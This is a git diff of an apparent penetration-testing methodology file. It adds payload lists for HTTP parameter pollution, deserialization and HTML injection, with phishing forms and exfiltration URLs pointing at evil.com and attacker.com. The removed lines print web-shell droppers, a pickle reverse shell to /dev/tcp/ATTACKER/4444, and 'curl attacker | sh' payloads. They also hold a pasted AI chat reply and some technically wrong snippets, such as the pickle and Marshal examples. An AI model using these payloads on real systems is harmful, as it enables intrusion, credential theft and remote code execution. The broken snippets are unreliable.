@@ -919,6 +919,113 @@ Wordlist examples:
 * [Arjun/small.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/small.txt)
 * [samlists/sam-cc-parameters-lowercase-all.txt](https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-lowercase-all.txt)
 * [samlists/sam-cc-parameters-mixedcase-all.txt](https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-mixedcase-all.txt)
+
+# 🔹 Basic HPP (HTTP Parameter Pollution)
+
+* Duplicate parameter: ?id=123&id=456 → Backend may take last/first or merge.
+* Override value: ?role=user&role=admin → Privilege escalation if last wins.
+* Boolean flip: ?admin=false&admin=true → Logic confusion.
+* Auth bypass: ?auth=0&auth=1 → Filter may check first only.
+* Access override: ?access=guest&access=admin → Final privilege elevated.
+
+# 🔹 Authentication & Authorization Tricks
+
+* Hidden admin flag: ?isAdmin=true
+* Role injection: ?role=admin
+* Privilege escalation: ?access_level=999
+* Feature unlock: ?premium=true
+* Disable auth check: ?skipAuth=1
+* Internal access: ?internal=true
+* Dev mode: ?debug=true
+* Impersonation: ?impersonate=admin
+* Switch user: ?loginAs=admin
+* Trust flag: ?trusted=true
+
+# 🔹 Encoding Tricks (WAF Bypass)
+
+* Encoded pollution: ?id=1%26id=2 → %26 = &
+* Double encoding: ?id=1%2526id=2
+* Null byte: ?file=report.pdf%00.exe
+* Space bypass: ?role=admin%20
+* Tab injection: ?role=admin%09
+* Newline injection: ?role=admin%0a
+* Mixed encoding: ?auth=true%26auth=false
+* Unicode encoding: ?role=%61%64%6d%69%6e
+* Case variation: ?RoLe=AdMiN
+* Hex obfuscation: ?role=%41%64%6d%69%6e
+
+# 🔹 Parameter Pollution Variants
+
+* Array style: ?role[]=user&role[]=admin
+* JSON-like: ?user[role]=admin
+* Nested params: ?data[auth]=true
+* Dot notation: ?user.role=admin
+* Mixed delimiters: ?id=1;id=2
+* Comma injection: ?id=1,2
+* Pipe injection: ?id=1|2
+* Multi-key chain: ?a=1&a=2&a=admin
+* Encoded chain: ?id=1%26id=admin
+* Duplicate cookies param: ?cookie=session=abc&cookie=session=admin
+
+# 🔹 Path & Query Confusion
+
+* Nested query: ?next=?redirect=https://evil.com
+* Chained redirect: ?url=https://safe.com?next=https://evil.com
+* Fragment injection: ?redirect=https://evil.com#safe.com
+* Path override: ?path=/safe&path=/evil
+* File override: ?file=report.pdf&file=backdoor.php
+* API override: ?endpoint=/user&endpoint=/admin
+* Redirect chaining: ?redirect=/home&redirect=//evil.com
+* Relative path trick: ?path=../../admin
+* Absolute override: ?path=/var/www&path=/etc/passwd
+* Mixed path encoding: ?path=%2fadmin
+
+# 🔹 Advanced Injection / Backend Abuse
+
+* SQL style bypass: ?role=admin'--
+* Boolean injection: ?admin=true OR 1=1
+* Logic chaining: ?role=admin||true
+* Multi-condition: ?access=admin&&1=1
+* Comment bypass: ?role=admin/*
+* JSON pollution: {"role":"user","role":"admin"}
+* Prototype pollution: ?__proto__.admin=true
+* Constructor injection: ?constructor.role=admin
+* Config override: ?config[debug]=true
+* Settings pollution: ?settings[admin]=1
+
+# 🔹 HTTP Header / Hidden Surface Tricks
+
+* Header duplication:  X-Forwarded-For: 127.0.0.1, X-Forwarded-For: evil.com
+* Host override: Host: victim.com + Host: attacker.com
+* Content-Type confusion: application/json + application/x-www-form-urlencoded
+* Cookie override: session=abc; session=admin
+* Authorization override: Authorization: user + Authorization: admin
+
+# 🔹 Real-World Attack Use Cases
+
+* Login bypass: ?user=admin&user=guest
+* Payment tampering: ?amount=100&amount=1
+* Role escalation: ?role=user&role=admin
+* File download abuse: ?file=report.pdf&file=evil.exe
+* Redirect bypass: ?next=safe.com&next=evil.com
+* Feature unlock: ?plan=free&plan=enterprise
+* Rate limit bypass: ?limit=10&limit=1000
+* API privilege switch: ?scope=user&scope=all
+* Debug exposure: ?mode=prod&mode=debug
+* Admin panel access: ?page=home&page=admin
+
+# 🔹 WAF Bypass Techniques (Combined)
+
+* Case toggling: ?rOlE=AdMiN
+* Encoding + pollution: ?role=user%26role=admin
+* Parameter splitting: ?ro=admin&le=
+* Mixed separators: ?role=admin;role=user
+* Double param + encoding:  ?role=user&role=%61%64%6d%69%6e
+* Comment obfuscation: ?role=admin/**/
+* Junk padding: ?role=admin123 (backend trims)
+* Alternate keys: ?user_role=admin
+* Duplicate key order flip:  ?role=admin&role=user vs ?role=user&role=admin
+* Proxy-based injection: add params via headers/body mismatch
 ----
 # Insecure Deserialization
 
@@ -944,424 +1051,78 @@ Check the following sub-sections, located in other chapters :
 | Python Pickle   | 80 04 95     | gASV            |
 | PHP Serialized  | 4F 3A        | Tz              |
 
-Absolutely, Anvesh. Based on your repo structure and the methodology outlined in your pilot testing doc, here’s a comprehensive, GitHub-ready Markdown checklist covering **insecure deserialization** across common formats and platforms:
+# 🔹 Modifying Serialized Objects
 
----
+* Admin flag manipulation: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}` → Change `admin` boolean from `b:0` to `b:1` to gain admin access. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
+* Session cookie tampering: Encoded cookie → decode → modify serialized object → re-encode → resend request → Access admin panel. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
+* Privilege escalation via object field: Modify serialized attribute values → Application trusts modified object → Elevated privileges granted. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
 
-## 🧨 Insecure Deserialization – Pentest Checklist
+# 🔹 Modifying Serialized Data Types
 
-### 🔍 Identification Criteria
-- ✅ Application accepts serialized data (JSON, XML, binary, etc.)
-- ✅ Deserialization occurs without integrity checks or class whitelisting
-- ✅ Stack traces or error messages reveal deserialization libraries
-- ✅ Presence of known serialization formats (e.g., `rO0AB`, `O:`, `a:`, `b'aced'`)
+* Type juggling attack: `s:12:"access_token";s:"ABC123"` → `i:0` → Integer bypasses validation due to loose comparison. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
+* Changing data type indicator: Replace `s` (string) with `i` (integer) in serialized data → Alters backend comparison logic. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
+* Authentication bypass: `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}` → Login as administrator without valid token. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
 
----
+***
 
-### 🧪 Fuzzable Entry Points
+# 🔹 Using Application Functionality to Exploit Deserialization
 
-```text
-session, token, data, payload, object, blob, state, config, user, profile, settings, preferences, export, import, backup, restore, message, request, response, cache, cookie
-```
+* File deletion via object property: `{"avatar_link":"/home/carlos/morale.txt"}` → Application uses this path and deletes the file. [\[g4nd1v.github.io\]](https://g4nd1v.github.io/portswigger/portswigger-deserialization/)
+* Business logic abuse: Modify serialized object fields that are later used in sensitive operations → Trigger unintended actions (e.g., delete file). [\[g4nd1v.github.io\]](https://g4nd1v.github.io/portswigger/portswigger-deserialization/)
+* Dangerous method invocation: Serialized object passed into functionality → Application invokes method using attacker-controlled data. [\[g4nd1v.github.io\]](https://g4nd1v.github.io/portswigger/portswigger-deserialization/)
 
----
+***
 
-### 🛠️ Tooling Suggestions
+# 🔹 Arbitrary Object Injection in PHP
 
-| Tool | Purpose |
-|------|---------|
-| [ysoserial](https://github.com/frohoff/ysoserial) | Java gadget chain generation |
-| [PHPGGC](https://github.com/ambionics/phpggc) | PHP gadget chains |
-| [SerialKiller](https://github.com/NetSPI/SerialKiller) | .NET deserialization testing |
-| [Burp Deserialization Scanner](https://github.com/PortSwigger/deserialization-scanner) | Passive detection |
-| [Hackvertor](https://portswigger.net/bappstore/3e8c6e0d7f4a4e2c9e6b8f5b4e8c6e0d) | Encoding/decoding payloads |
+* Injecting new object type: Replace expected object with attacker-controlled class → Application instantiates it. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization)
+* Object property control: Modify class properties → Influence application behavior during execution. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization)
+* Object injection impact: Ability to supply arbitrary objects → Leads to logic abuse or code execution depending on available classes. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization)
 
----
+***
 
-**1. Blind Callback via Deserialization**  
-Trigger DNS/HTTP exfiltration to confirm deserialization execution.
+# 🔹 Exploiting Java Deserialization (Apache Commons)
 
-```java
-// Java (ysoserial - CommonsCollections1)
-Payload: http://oast.test/ping
+* Serialized Java object in session: Base64 cookie → decode → reveals Java serialized object (`aced` header). [\[siunam321.github.io\]](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-5/)
+* Gadget chain exploitation: Use tool to generate malicious serialized object → Send to server → Execute command. [\[siunam321.github.io\]](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-5/)
+* Remote code execution: Replace session object with crafted payload → Server deserializes → Executes attacker-controlled action. [\[siunam321.github.io\]](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-5/)
 
-// PHP
-O:8:"Exploit":1:{s:4:"ping";s:33:"http://oast.test/ping.jpg";}
+***
 
-// JSON (Jackson)
-{"@type":"java.net.URL","val":"http://oast.test/callback"}
-```
+# 🔹 Exploiting PHP Deserialization (Pre-built Gadget Chain)
 
----
+* Framework identification: Extract framework info (e.g., Symfony) → Select matching gadget chain. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
+* Payload generation: Generate serialized object using PHPGGC → Encoded payload contains exploit. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
+* Signed cookie bypass: Recreate valid signature (HMAC) with leaked key → Server accepts malicious object. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
+* RCE via gadget chain: Inject signed malicious object → Server unserializes → Executes payload. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
 
-**2. File Write via Gadget Chain**  
-Write arbitrary file to disk during deserialization.
+# 🔹 Exploiting Ruby Deserialization (Documented Gadget Chain)
 
-```java
-// ysoserial - FileOutputStream chain
-Creates: /tmp/proof.txt
+* Use documented gadget chain: Identify known Ruby gadgets → Craft payload → Send serialized object
+* Object execution flow:  Deserialization triggers chain of method calls → Leads to execution
+*(Sources confirm use of documented gadget chains for exploitation, but do not provide a specific payload example.)* [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting)
 
-// PHPGGC - Monolog/RCE1
-Writes: /tmp/success.txt with attacker-controlled content
-```
+# 🔹 Developing Custom Gadget Chains (Java / PHP)
 
----
+* Identify available classes: Analyze application → Find classes with useful methods
+* Chain method calls: Combine multiple objects → Control execution flow
+* Reach dangerous sink: Chain leads to function like command execution / file operation
+*(Described as chaining method invocations into dangerous sinks; exact payloads depend on target code.)* [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting)
 
-**3. Remote Command Execution**  
-Execute system commands via deserialization gadgets.
+# 🔹 PHAR Deserialization Attack
 
-```java
-// ysoserial - ProcessBuilder
-Payload: `whoami`
+* PHAR wrapper abuse: `phar://file` used in file operation → Triggers deserialization
+* File operation trigger: Functions like `file_exists()` on PHAR → Deserialize metadata
+* Payload delivery: Upload crafted PHAR file → Trigger via application file handling
+*(PHAR metadata deserialization is triggered when file functions interact with PHAR streams.)* [\[github.com\]](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)
 
-// PHPGGC - SwiftMailer/Fwrite
-Payload: `uname -a`
+# 🔹 Real-World Attack Outcomes (From Labs)
 
-// JSON (Spring Boot)
-{"@type":"java.lang.ProcessBuilder","command":["id"]}
-```
-
----
-
-**4. Time-Based Blind Execution**  
-Use sleep/delay to confirm code execution.
-
-```java
-// Java
-${T(java.lang.Thread).sleep(5000)}
-
-// PHP
-O:8:"Exploit":1:{s:4:"cmd";s:5:"sleep";}
-
-// Python (Pickle)
-pickle.loads with time.sleep(5)
-```
-
----
-
-**5. Logic Bypass via Type Confusion**  
-Replace expected object type to bypass validation.
-
-```php
-// Replace expected `User` with `stdClass`
-O:8:"stdClass":1:{...}
-
-// JSON
-{"@type":"com.fasterxml.jackson.databind.node.ObjectNode","x":1}
-```
-
----
-
-**6. Malformed Blob Crash**  
-Trigger parser exceptions with corrupted payloads.
-
-```java
-// Truncated blob
-Payload: `rO0A....`
-
-// PHP
-O:8:"Broken":3:{s:4:"x";i:2; => malformed structure
-```
-
----
-
-**7. Unsafe XML Deserialization**  
-Inject objects via XML parsers that support class loading.
-
-```xml
-<object class="java.lang.Runtime">
-  <method>getRuntime().exec("calc.exe")</method>
-</object>
-```
-
----
-
-**8. Python Pickle RCE**  
-Exploit unsafe `pickle.loads()` usage.
-
-```python
-import pickle, os
-payload = pickle.dumps(os.system('id'))
-```
-
----
-
-**9. Ruby Marshal RCE**  
-Exploit unsafe `Marshal.load()` usage.
-
-```ruby
-Marshal.dump(`id`)
-```
-
----
-
-**10. Cache Poisoning via Deserialization**  
-Inject serialized blob into Redis/Memcached.
-
-```java
-// Poisoned object stored under known key
-Retrieval triggers deserialization and execution
-```
-
----
-
-**11. Cookie-Based Deserialization**  
-Embed serialized object in session or JWT cookie.
-
-```php
-// Encoded session cookie
-O:8:"Exploit":1:{s:4:"role";s:5:"admin";}
-```
-# **✅ Insecure Deserialization – Complete Test Case (with Bypass Cases)**
-
-1 Remote Code Execution via Object Deserialization
-
-2 Arbitrary Object Injection
-
-3 ClassLoader Instantiation Abuse
-
-4 Magic Method Exploitation (__wakeup / __destruct / __toString)
-
-5 PHP Serialization Attack (PHP Object Injection)
-
-6 Java Deserialization (Commons-Collections Gadget)
-
-7 Python Pickle RCE
-
-8 .NET BinaryFormatter RCE
-
-9 Node.js Serialized Payload Injection
-
-10 Bypass of Integrity Checks (HMAC, MAC, Signing)
----
-
-# **2. Sample Payloads (Core Attack Payloads)**
-
-*(Normal structured payload list)*
-
-```
-2.1 PHP Serialized Object Injection
-O:8:"Example":1:{s:4:"cmd";s:2:"id";}
-```
-
-```
-2.2 Java Serialized Object (Commons Collections)
-(ac ed 00 05 ... binary payload ...)
-```
-
-```
-2.3 Python Pickle Malicious Payload
-cos
-system
-(S'id')
-```
-
-```
-2.4 Node.js Serialized Object Attack
-{"rce":{"__proto__":{"exec":"node -e '...'"} }}
-```
-
-```
-2.5 Ruby Marshal RCE
-"\x04\bo:@ExploitClass\t:\n@commandI\"id"
-```
-
-```
-2.6 Signed Serialization Token Tampering
-{"token":"base64(serialized_object)"}
-```
-
-```
-2.7 Tampering Serialized Cookies
-Set-Cookie: session=serialized_data_here
-```
-
-```
-2.8 JavaScript Object Deserialization (Unsafe JSON.parse)
-{"__proto__":{"isAdmin":true}}
-```
-
-```
-2.9 Config File Deserialization Attack
-settings=base64(serialized_object)
-```
-
-```
-2.10 Unsafe BinaryFormatter (.NET) Payload
-(binary stream containing prebuilt gadget)
-```
-
----
-
-# **3. Sample Payloads (Updated With Real Offensive Payloads)**
-
-*(Real attack payloads used in ransomware, shell drops, and privilege escalation)*
-
-```
-3.1 PHP POP Chain → RCE
-O:8:"Exploit":2:{s:4:"file";s:12:"/tmp/shell";s:4:"code";s:13:"<?php eval($_GET['x']);?>";}
-```
-
-```
-3.2 PHP __destruct File Write → Web Shell Dropper
-O:6:"Logger":1:{s:4:"log";s:40:"<?php system($_GET['cmd']); ?>";}
-```
-
-```
-3.3 Java Commons-Collections 7 RCE Gadget
-(base64 Gadgets)
-rO0ABXNyABF...
-```
-
-```
-3.4 Python Pickle Reverse Shell
-cos
-system
-(S"bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
-tR.
-```
-
-```
-3.5 Ruby Marshal Payload (Metasploit)
-\x04\bo:@Exploit\x06:\f@payloadI\"curl attacker/pwn|sh"
-```
-
-```
-3.6 .NET BinaryFormatter RCE Gadget (ysoserial.net)
-AAEAAAD/////AQAAAAAAAAAEAQAAAC...
-```
-
-```
-3.7 Node.js Express-session Poisoning
-{"cookie":{"originalMaxAge":null,"expires":"-1"},"__proto__":{"outputFunction":"require('child_process').exec('curl http://attacker/p.sh | sh')"}}
-```
-
-```
-3.8 YAML Deserialization → RCE
-!!python/object/apply:os.system ["id"]
-```
-
-```
-3.9 Perl Storable Deserialize Command Execution
-$VAR1 = bless( { cmd => 'id' }, 'Exploit' );
-```
-
-```
-3.10 Golang gob Decoder Exploit
-(binary gob-encoded payload crafted to instantiate interfaces)
-```
-
----
-
-# **4. Bypass Techniques (WAF, Signing, Filters, Validators)**
-
-*(Same style as previous attack formats)*
-
-```
-4.1 Base64 Double Encoding
-base64(base64(serialized payload))
-```
-
-```
-4.2 JSON Wrapping Bypass
-{"data":"serialized_here"}
-```
-
-```
-4.3 Magic-Bytes Obfuscation
-\x00\x01\x02O:3:"ABC":1:{...}
-```
-
-```
-4.4 Signature Stripping (Weak HMAC)
-token = base64(payload) + "." + weak_signature
-```
-
-```
-4.5 PHP Serialization Splitting
-O:3:"A":1:{s:1:"x";s:3:"abc";}
-O:+1:"B":1:{s:1:"x";s:3:"cmd";}
-```
-
-```
-4.6 Whitespace / Newline Injection
-O:6:"Class":
-1
-:{
-...
-}
-```
-
-```
-4.7 Unicode Obfuscation
-O\u003a6\u003a\"Class\"...
-```
-
-```
-4.8 Chunked Transfer Encoding (WAF Bypass)
-Transfer-Encoding: chunked
-(serialized payload split into chunks)
-```
-
-```
-4.9 Cookie Prefix Bypass
-__Host-session -> session
-```
-
-```
-4.10 Compression Bypass (gzip/base64)
-H4sIAAAAA (GZIPed payload)
-```
-
----
-
-# **5. Advanced Attack Chains (Real-World Exploitation)**
-
-```
-5.1 Insecure Deserialization → Remote Code Execution
-Upload serialized object → triggers magic methods → executes system("id")
-```
-
-```
-5.2 Signed Token Bypass → Account Takeover
-Manipulate HMAC-signed session → user=admin
-```
-
-```
-5.3 Python Pickle in ML API → Server Takeover
-{"model": base64(pickle_rce_payload)}
-```
-
-```
-5.4 Java Deserialization → JNDI → LDAP RCE
-Serialized object calls remote lookup → loads attacker class
-```
-
-```
-5.5 Node.js Deserialization → Prototype Pollution → Eval RCE
-{"__proto__":{"outputFunction":"require('child_process').exec('id')"}}
-```
-
-```
-5.6 Ruby Marshal → RCE on Rails apps
-session=Marshal.dump(exploit_object)
-```
-
-```
-5.7 YAML → RCE Chain
-!!python/object/new:subprocess.Popen ["curl attacker | sh"]
-```
-
-## POP Gadgets
-
-> A POP (Property Oriented Programming) gadget is a piece of code implemented by an application's class, that can be called during the deserialization process.
-
-POP gadgets characteristics:
-
-* Can be serialized
-* Has public/accessible properties
-* Implements specific vulnerable methods
-* Has access to other "callable" classes
+* Privilege escalation → Modify serialized object (`admin=true`)
+* Authentication bypass → Change data types (`token=i:0`)
+* File deletion → Control file path in object
+* Remote code execution → Use gadget chains (Java/PHP)
+* Arbitrary object execution → Inject attacker-controlled class
 
 ## Labs
 
@@ -1376,69 +1137,7 @@ POP gadgets characteristics:
 * [PortSwigger - Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
 * [PortSwigger - Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
 * [NickstaDB - DeserLab](https://github.com/NickstaDB/DeserLab)
-
 ----
-### Parameter Pollution Table
-
-When ?par1=a&par1=b
-
-| Technology                                      | Parsing Result           | outcome (par1=) |
-| ----------------------------------------------- | ------------------------ | --------------- |
-| ASP.NET/IIS                                     | All occurrences          | a,b             |
-| ASP/IIS                                         | All occurrences          | a,b             |
-| Golang net/http - `r.URL.Query().Get("param")`  | First occurrence         | a               |
-| Golang net/http - `r.URL.Query()["param"]`      | All occurrences in array | ['a','b']       |
-| IBM HTTP Server                                 | First occurrence         | a               |
-| IBM Lotus Domino                                | First occurrence         | a               |
-| JSP,Servlet/Tomcat                              | First occurrence         | a               |
-| mod_wsgi (Python)/Apache                        | First occurrence         | a               |
-| Nodejs                                          | All occurrences          | a,b             |
-| Perl CGI/Apache                                 | First occurrence         | a               |
-| Perl CGI/Apache                                 | First occurrence         | a               |
-| PHP/Apache                                      | Last occurrence          | b               |
-| PHP/Zues                                        | Last occurrence          | b               |
-| Python Django                                   | Last occurrence          | b               |
-| Python Flask                                    | First occurrence         | a               |
-| Python/Zope                                     | All occurrences in array | ['a','b']       |
-| Ruby on Rails                                   | Last occurrence          | b               |
-
-### Parameter Pollution Payloads
-
-* Duplicate Parameters:
-
-    ```ps1
-    param=value1&param=value2
-    ```
-
-* Array Injection:
-
-    ```ps1
-    param[]=value1
-    param[]=value1&param[]=value2
-    param[]=value1&param=value2
-    param=value1&param[]=value2
-    ```
-
-* Encoded Injection:
-
-    ```ps1
-    param=value1%26other=value2
-    ```
-
-* Nested Injection:
-
-    ```ps1
-    param[key1]=value1&param[key2]=value2
-    ```
-
-* JSON Injection:
-
-    ```ps1
-    {
-        "test": "user",
-        "test": "admin"
-    }
-    ```
 
 # 5. Parameter Tampering (All Parameters Change)
 
@@ -1485,7 +1184,6 @@ we can use the -amount also  such as 100  --99
 <h1>Vulnerable for HTML Injection</h1>
 <A HREF="http://bing.com/">OffensiveHunter</A>
 ```
-
 **DOM HTML Injection Example:**
 ```html
 <script>
@@ -1498,7 +1196,95 @@ window.onload = setMessage;
 <a href="#message"> Show Here</a>
 <div id="message">Showing Message</div>
 ```
+# 🔹 Basic HTML Injection Payloads
 
+* Simple tag injection: `<h1>Injected</h1>` → Direct HTML rendering in response.
+* Breaking context (attribute): `"><h1>Injected</h1>` → Escapes attribute and injects HTML.
+* Inline content injection: `<b>Admin Panel</b>` → Modifies UI content.
+* Form injection: `<form><input type="text" name="admin"></form>` → Fake input fields.
+* Image injection: `x` → Injects HTML element (no JS required).
+
+# 🔹 UI Manipulation Attacks
+
+* Fake login form: `<form action="https://evil.com"><input name="user"></form>` → Credential phishing.
+* Button injection:`<button>Click Here</button>` → Misleading UI action.
+* Overlay attack: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white"></div>` → Blocks real page.
+* Input override: `<input value="admin">` → Pre-fill values.
+* Hidden admin link: `/adminAdmin</a>` → Adds hidden navigation.
+
+# 🔹 Attribute Context Injection
+
+* Attribute break: `" ><h1>Injected</h1>` → Breaks out of attribute context.
+* Inject into existing tag: `x<h1>Injected</h1>`
+* Event attribute injection (if JS allowed): `" onmouseover="alert(1)`
+* Style injection: `" style="color:red"`
+* Class override: `" class="admin"`
+
+# 🔹 HTML Injection + Data Exfiltration (No JS)
+
+* Image-based exfiltration: `https://attacker.com/log?data=USER`
+* Link-based stealing: `<a href="https://evil.com">Click</a>`
+* Autofetch resource: `<iframe src="https://evil.com"></iframe>`
+* Meta tag redirect: `<meta http-equiv="refresh" content="0;url=https://evil.com">`
+
+# 🔹 DOM Manipulation via HTML Injection
+
+* Inject iframe: `<iframe src="https://evil.com"></iframe>`
+* Inject script tag placeholder (blocked sometimes): `<script>alert(1)</script>`
+* Inject object tag:  `<object data="https://evil.com"></object>`
+* Embed content: `<embed src="https://evil.com">`
+
+# 🔹 Form & Input Injection
+
+* Override existing form: `<form action="https://evil.com"><input name="password"></form>`
+* Add hidden input: `<input type="hidden" value="admin">`
+* Change button behavior: `<button formaction="https://evil.com">Submit</button>`
+* Autofill trick: `<input value="hacked">`
+
+# 🔹 WAF Bypass Techniques (HTML Injection)
+
+## 🧩 Encoding Tricks
+
+* HTML encoding: `&lt;h1&gt;Injected&lt;/h1&gt;` → Decoded by backend.
+* Double encoding: `&amp;lt;h1&amp;gt;Injected&amp;lt;/h1&amp;gt;`
+* URL encoding: `%3Ch1%3EInjected%3C/h1%3E`
+* Mixed encoding: `%3Cimg src=x%3E`
+
+## 🧩 Case & Obfuscation
+
+* Case variation: `<H1>Injected</H1>`
+* Broken tag: `<h1 / >Injected</h1>`
+* Random spacing: `<h1    >Injected</h1>`
+* Junk padding: `<h1>Injected123</h1>`
+
+## 🧩 Tag Obfuscation
+
+* Split tag: `<h` + `1>Injected</h1>`
+* Null byte injection: `x%00`
+* Comment breaking: `<h1><!--test-->Injected</h1>`
+* Nested tags: `<div><h1>Injected</h1></div>`
+
+## 🧩 Attribute-Level Bypass
+
+* Broken attribute: `" >x`
+* Inject inside attribute: `test" /><h1>Injected</h1>`
+* Mixed quotes: `'"><h1>Injected</h1>`
+* Encoded quote: `%22><h1>Injected</h1>`
+
+## 🧩 Event & Browser Parsing Tricks
+
+* Partial tag injection: `x`
+* Alternate attributes: `<svg><text>Injected</text></svg>`
+* Polyglot HTML: `<iframe/src=evil.com>`
+* Non-standard tags: `<customtag>Injected</customtag>`
+
+# 🔹 Real-World Attack Scenarios
+
+* Fake login page: `<form action="https://evil.com"><input name="password"></form>` → Credential theft.
+* UI defacement: `<h1>Website Hacked</h1>` → Visible defacement.
+* Click hijacking: `<a href="https://evil.com">Download</a>` → Misleading links.
+* Sensitive redirection: `<meta http-equiv="refresh" content="0;url=https://evil.com">`
+* Admin confusion: `<div>Welcome Admin</div>` → Social engineering.
 ---
 
 # 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)
